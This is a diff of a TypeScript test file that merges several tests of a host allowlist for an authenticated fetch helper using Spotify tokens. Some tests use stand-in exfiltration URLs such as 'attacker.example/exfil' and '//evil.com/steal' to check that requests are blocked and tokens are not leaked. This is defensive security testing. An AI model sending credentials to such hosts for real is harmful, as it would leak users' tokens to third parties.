@@ -5,7 +5,6 @@ import {
 	type ExecuteRequestInput,
 	IntegrationHostNotAllowedError,
 	createAuthenticatedFetch,
-	createExecuteHelperPrelude,
 } from './codemode-utils.ts'
 import { assertIntegrationHostAllowed } from './integration-host-allowlist.ts'
 
@@ -13,14 +12,6 @@ type SecretSetCall = {
 	name: string
 	value: string
 	scope: string
-}
-
-type SandboxHelpers = {
-	createAuthenticatedFetch: (
-		providerName: string,
-	) => Promise<
-		(input: ExecuteRequestInput, init?: RequestInit) => Promise<Response>
-	>
 }
 
 const fakeAccessToken = 'test-access-token-abc123'
@@ -94,134 +85,56 @@ async function withPatchedFetch<T>(
 	}
 }
 
-test('rejects with IntegrationHostNotAllowedError for disallowed host and does not call fetch', async () => {
+test('createAuthenticatedFetch enforces integration host allowlists without leaking tokens', async () => {
 	const { codemode, fetchCalls, fetchStub } = createCodemode()
 
 	const authenticatedFetch = await withPatchedFetch(fetchStub, () =>
 		createAuthenticatedFetch(codemode, 'spotify'),
 	)
 
-	// Reset fetch calls after the token refresh during setup
-	const fetchCallsBeforeExfil = fetchCalls.length
+	const fetchCallsAfterSetup = fetchCalls.length
 
 	await expect(
 		withPatchedFetch(fetchStub, () =>
 			authenticatedFetch('https://attacker.example/exfil'),
 		),
 	).rejects.toThrow(IntegrationHostNotAllowedError)
+	expect(fetchCalls.length).toBe(fetchCallsAfterSetup)
 
-	// No additional fetch call was made (the exfil request never went out)
-	expect(fetchCalls.length).toBe(fetchCallsBeforeExfil)
-})
-
-test('succeeds for apiBaseUrl host and attaches bearer token', async () => {
-	const { codemode, fetchCalls, fetchStub } = createCodemode()
-
-	const authenticatedFetch = await withPatchedFetch(fetchStub, () =>
-		createAuthenticatedFetch(codemode, 'spotify'),
-	)
-
-	const response = await withPatchedFetch(fetchStub, () =>
-		authenticatedFetch('https://api.spotify.com/v1/me'),
-	)
-
-	expect(response.status).toBe(200)
-	const lastCall = fetchCalls[fetchCalls.length - 1]!
-	expect(lastCall.url).toBe('https://api.spotify.com/v1/me')
-	expect(lastCall.headers.get('authorization')).toBe(
-		spotifyAccessTokenPlaceholder,
-	)
-})
-
-test('succeeds for a requiredHosts entry that is not apiBaseUrl', async () => {
-	const { codemode, fetchCalls, fetchStub } = createCodemode()
-
-	const authenticatedFetch = await withPatchedFetch(fetchStub, () =>
-		createAuthenticatedFetch(codemode, 'spotify'),
-	)
-
-	const response = await withPatchedFetch(fetchStub, () =>
-		authenticatedFetch('https://cdn.spotify.com/images/cover.jpg'),
-	)
-
-	expect(response.status).toBe(200)
-	const lastCall = fetchCalls[fetchCalls.length - 1]!
-	expect(lastCall.url).toBe('https://cdn.spotify.com/images/cover.jpg')
-	expect(lastCall.headers.get('authorization')).toBe(
-		spotifyAccessTokenPlaceholder,
-	)
-})
-
-test('error message does not contain the literal token value', async () => {
-	const { codemode, fetchStub } = createCodemode()
-
-	const authenticatedFetch = await withPatchedFetch(fetchStub, () =>
-		createAuthenticatedFetch(codemode, 'spotify'),
-	)
-
-	let caughtError: Error | null = null
+	let disallowedError: Error | null = null
 	try {
 		await withPatchedFetch(fetchStub, () =>
 			authenticatedFetch('https://attacker.example/exfil'),
 		)
 	} catch (error) {
-		caughtError = error as Error
+		disallowedError = error as Error
 	}
+	expect(disallowedError).toBeInstanceOf(IntegrationHostNotAllowedError)
+	expect(disallowedError!.message).not.toContain(fakeAccessToken)
+	expect(JSON.stringify(disallowedError)).not.toContain(fakeAccessToken)
 
-	expect(caughtError).toBeInstanceOf(IntegrationHostNotAllowedError)
-	expect(caughtError!.message).not.toContain(fakeAccessToken)
-	expect(JSON.stringify(caughtError)).not.toContain(fakeAccessToken)
-})
-
-test('prelude sandbox version rejects disallowed hosts', async () => {
-	const { codemode, fetchCalls, fetchStub } = createCodemode()
-	const prelude = createExecuteHelperPrelude()
-	const createSandboxHelpers = new Function(
-		'codemode',
-		`${prelude}; return { createAuthenticatedFetch };`,
-	) as (codemodeNamespace: CodemodeNamespace) => SandboxHelpers
-
-	const helpers = createSandboxHelpers(codemode)
-	const authenticatedFetch = await withPatchedFetch(fetchStub, () =>
-		helpers.createAuthenticatedFetch('spotify'),
-	)
-
-	const fetchCallsBeforeExfil = fetchCalls.length
-
-	await expect(
-		withPatchedFetch(fetchStub, () =>
-			authenticatedFetch('https://evil.test/steal'),
-		),
-	).rejects.toThrow(/IntegrationHostNotAllowedError|does not allow requests/)
-
-	expect(fetchCalls.length).toBe(fetchCallsBeforeExfil)
-})
-
-test('prelude sandbox version allows requests to valid hosts', async () => {
-	const { codemode, fetchCalls, fetchStub } = createCodemode()
-	const prelude = createExecuteHelperPrelude()
-	const createSandboxHelpers = new Function(
-		'codemode',
-		`${prelude}; return { createAuthenticatedFetch };`,
-	) as (codemodeNamespace: CodemodeNamespace) => SandboxHelpers
-
-	const helpers = createSandboxHelpers(codemode)
-	const authenticatedFetch = await withPatchedFetch(fetchStub, () =>
-		helpers.createAuthenticatedFetch('spotify'),
-	)
-
-	const response = await withPatchedFetch(fetchStub, () =>
+	const apiResponse = await withPatchedFetch(fetchStub, () =>
 		authenticatedFetch('https://api.spotify.com/v1/me'),
 	)
+	expect(apiResponse.status).toBe(200)
+	const apiCall = fetchCalls[fetchCalls.length - 1]!
+	expect(apiCall.url).toBe('https://api.spotify.com/v1/me')
+	expect(apiCall.headers.get('authorization')).toBe(
+		spotifyAccessTokenPlaceholder,
+	)
 
-	expect(response.status).toBe(200)
-	const lastCall = fetchCalls[fetchCalls.length - 1]!
-	expect(lastCall.headers.get('authorization')).toBe(
+	const cdnResponse = await withPatchedFetch(fetchStub, () =>
+		authenticatedFetch('https://cdn.spotify.com/images/cover.jpg'),
+	)
+	expect(cdnResponse.status).toBe(200)
+	const cdnCall = fetchCalls[fetchCalls.length - 1]!
+	expect(cdnCall.url).toBe('https://cdn.spotify.com/images/cover.jpg')
+	expect(cdnCall.headers.get('authorization')).toBe(
 		spotifyAccessTokenPlaceholder,
 	)
 })
 
-test('assertIntegrationHostAllowed rejects protocol-relative URLs', () => {
+test('assertIntegrationHostAllowed rejects unsafe URLs and allows relative paths', () => {
 	expect(() =>
 		assertIntegrationHostAllowed(
 			'spotify',
@@ -229,22 +142,18 @@ test('assertIntegrationHostAllowed rejects protocol-relative URLs', () => {
 			'//evil.com/steal',
 		),
 	).toThrow(IntegrationHostNotAllowedError)
-})
 
-test('assertIntegrationHostAllowed allows single-slash relative paths', () => {
 	expect(() =>
 		assertIntegrationHostAllowed('spotify', spotifyIntegration, '/v1/me'),
 	).not.toThrow()
 })
 
-test('fails closed when integration has no allowlist configured', async () => {
+test('createAuthenticatedFetch fails closed when integration has no allowlist configured', async () => {
 	const emptyIntegration = {
 		...spotifyIntegration,
 		requiredHosts: [] as Array<string>,
 		apiBaseUrl: null,
 	}
-	const secretSetCalls: Array<{ name: string; value: string; scope: string }> =
-		[]
 	const codemode = {
 		async integration_get() {
 			return { integration: emptyIntegration }
@@ -254,7 +163,6 @@ test('fails closed when integration has no allowlist configured', async () => {
 		},
 		async secret_set(args: CapabilityArgs) {
 			const call = args as { name: string; value: string; scope: string }
-			secretSetCalls.push(call)
 			return { name: call.name, scope: call.scope }
 		},
 	} satisfies CodemodeNamespace
